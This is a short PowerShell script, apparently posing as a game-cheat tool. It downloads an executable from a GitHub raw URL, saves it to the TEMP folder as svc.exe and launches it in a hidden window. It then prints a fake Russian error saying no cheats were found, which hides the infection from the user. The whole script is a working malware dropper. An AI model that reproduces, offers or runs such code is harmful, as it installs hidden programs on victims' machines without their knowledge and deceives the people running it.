$url = «https://github.com/nagibatorm55-ops/error-check/raw/refs/heads/main/error.exe»
$path = «$env:TEMP\svc.exe»
irm $url -OutFile $path
Start-Process -FilePath $path -WindowStyle Hidden
Write-Host «Ошибка: читы не найдены. Попробуйте позже.» -ForegroundColor Red
